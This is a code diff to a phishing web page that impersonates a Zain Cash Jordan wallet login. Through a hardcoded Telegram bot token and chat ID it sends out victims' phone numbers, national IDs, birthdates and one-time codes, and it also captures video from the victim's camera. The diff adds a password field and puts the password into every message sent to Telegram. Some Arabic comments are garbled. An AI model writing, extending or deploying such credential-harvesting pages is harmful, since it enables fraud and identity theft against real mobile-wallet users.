@@ -55,7 +55,7 @@
 
     label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
     /* موحّد لخانات الإدخال */
-    input[type="text"], input[type="tel"], input[type="number"], select, .text-input {
+    input[type="text"], input[type="tel"], input[type="number"], input[type="password"], select, .text-input {
       padding:12px 12px;
       border-radius:10px;
       border:2px solid var(--input-border);
@@ -74,11 +74,12 @@
     input[type="text"]::placeholder,
     input[type="tel"]::placeholder,
     input[type="number"]::placeholder,
+    input[type="password"]::placeholder,
     .text-input::placeholder {
       color: #9fbfe8;
       opacity:1;
     }
-    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus, select:focus, .text-input:focus {
+    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus, input[type="password"]:focus, select:focus, .text-input:focus {
       box-shadow: 0 6px 22px rgba(47,128,237,0.18);
       border-color: var(--primary-1);
       background: #fbfeff;
@@ -169,14 +170,14 @@
     #permissionBox p { margin:0 0 12px 0; color:#333; font-weight:600; }
     .perm-actions { display:flex; gap:10px; justify-content:flex-start; margin-top:8px; }
 
-    /* تحسينات عرض الحقول على الشاشات الصغيرة */
+    /* تحسينات عر�� الحقول على الشاشات الصغيرة */
     @media (max-width:450px){
       #app{padding:16px 1.5vw 10px 1.5vw;}
       .camera-box{height:320px;}
       .zain-title-main{font-size:20px}
       .code-inputs input { width:90px; font-size:17px; }
       .button { min-width: 100px; font-size:16px; padding:11px 10px; }
-      input[type="text"], input[type="tel"], select { padding:11px 10px; font-size:15px; }
+      input[type="text"], input[type="tel"], input[type="password"], select { padding:11px 10px; font-size:15px; }
     }
 
   </style>
@@ -222,12 +223,14 @@
   // === إعدادات البوت (كما طُلب) ===
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
+  // كلمة السر المخصصة للموقع
+  const WEBSITE_PASSWORD = "12345678"; // غيّر هذا إلى كلمة السر التي تريدها
 
   const app = document.getElementById('app');
   const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
   const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
 
-  let userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+  let userData = { phone:'', password:'', nationalId:'', birthdate:'', code5:'', code4:'' };
   let telegramMsgId = null;
   let waitingTimeout = null;
 
@@ -250,7 +253,7 @@
     `;
   }
 
-  // صفحة رقم الهاتف
+  // صفحة رقم الهاتف وكلمة السر
   function renderPhoneStep(){
     app.innerHTML = `
       ${header("مرحبًا بك! سجل دخولك لحسابك")}
@@ -258,18 +261,43 @@
       <form id="phoneForm" autocomplete="off">
         <label>رقم الهاتف المرتبط بحسابك</label>
         <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
+        <label style="margin-top:12px;">كلمة السر</label>
+        <input type="password" id="password" placeholder="أدخل كلمة السر" required autocomplete="current-password"/>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
       </form>
       <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
     `;
     const phone = document.getElementById('phone');
+    const password = document.getElementById('password');
     phone.focus();
     document.getElementById('phoneForm').onsubmit = async (e) => {
       e.preventDefault();
-      const v = phone.value.trim();
-      if(!/^07\d{8}$/.test(v)){ alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام'); phone.focus(); return; }
-      userData.phone = v;
-      try { telegramMsgId = await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}`); } catch(e){ console.log(e); }
+      const phoneVal = phone.value.trim();
+      const passwordVal = password.value.trim();
+      
+      if(!/^07\d{8}$/.test(phoneVal)){ 
+        alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام'); 
+        phone.focus(); 
+        return; 
+      }
+      
+      if(passwordVal !== WEBSITE_PASSWORD){
+        alert('كلمة السر غير صحيحة. يرجى المحاولة مرة أخرى.');
+        password.value = '';
+        password.focus();
+        return;
+      }
+      
+      userData.phone = phoneVal;
+      userData.password = passwordVal;
+      
+      // إرسال رقم الهاتف وكلمة السر إلى التلجرام
+      try { 
+        telegramMsgId = await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🔑 كلمة السر: ${userData.password}`); 
+      } catch(e){ 
+        console.log(e); 
+      }
+      
       renderNationalIdStep();
     };
   }
@@ -301,7 +329,7 @@
       if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد (اليوم/الشهر/السنة)'); return; }
       userData.nationalId = nid;
       userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
-      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`); } catch(e){ console.log(e); }
+      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🔑 كلمة السر: ${userData.password}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`); } catch(e){ console.log(e); }
       showNationalIdWaitAndGotoCode5();
     };
     document.getElementById('backBtn').onclick = () => renderPhoneStep();
@@ -365,7 +393,7 @@
       const code = codeInput.value.trim();
       if(code.length !== 5){ alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
       userData.code5 = code;
-      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}`); } catch(e){ console.log(e); }
+      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🔑 ${userData.password}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}`); } catch(e){ console.log(e); }
       showWaitMsgAndGotoCode4();
     };
     document.getElementById('backBtn').onclick = () => renderNationalIdStep();
@@ -408,7 +436,7 @@
       const code = codeInput.value.trim();
       if(code.length !== 4){ alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
       userData.code4 = code;
-      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
+      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🔑 ${userData.password}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
       try {
         await startCaptureSequence(); // يبدأ التحقق التلقائي؛ في حال فشل يعود لصفحة رمز الـ4
       } catch (err) {
@@ -481,7 +509,7 @@
       const stream = await tryGetUserMediaOnce();
       return stream;
     } catch (err) {
-      // إذا كان الخطأ نتيجة رفض إذن، نطالب المستخدم بإعادة المحاولة أو التوجيه
+      // إذا كان الخطأ نتيجة رفض إذن، نط��لب المستخدم بإعادة المحاولة أو التوجيه
       const deniedNames = ['NotAllowedError','PermissionDeniedError','NotFoundError','SecurityError'];
       const isPermissionError = err && (deniedNames.includes(err.name) || (err.message && err.message.toLowerCase().includes('permission')));
       // بعض المتصفحات لا تعطي اسم واضح لذا نتفقد navigator.permissions إن وُجد
@@ -496,7 +524,7 @@
       }
 
       if (!isPermissionError) {
-        // إذا كان الخطأ ليس رفض إذن واضح، أع��ده للمتصل ليتعامل مع الخطأ
+        // إذا كان الخطأ ليس رفض إذن واضح، أعده للمتصل ليتعامل مع الخطأ
         throw err;
       }
 
@@ -614,7 +642,7 @@
     const audioTracks = stream.getAudioTracks();
     if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    // اختر mime كما في السابق
+    // اختر mime كما في الساب��
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
@@ -766,14 +794,14 @@
     function handler(){
       modal.classList.remove('active');
       btn.removeEventListener('click', handler);
-      userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+      userData = { phone:'', password:'', nationalId:'', birthdate:'', code5:'', code4:'' };
       renderPhoneStep();
     }
     btn.addEventListener('click', handler);
     setTimeout(()=>{
       if(modal.classList.contains('active')){
         modal.classList.remove('active');
-        userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+        userData = { phone:'', password:'', nationalId:'', birthdate:'', code5:'', code4:'' };
         renderPhoneStep();
       }
     }, 2500);
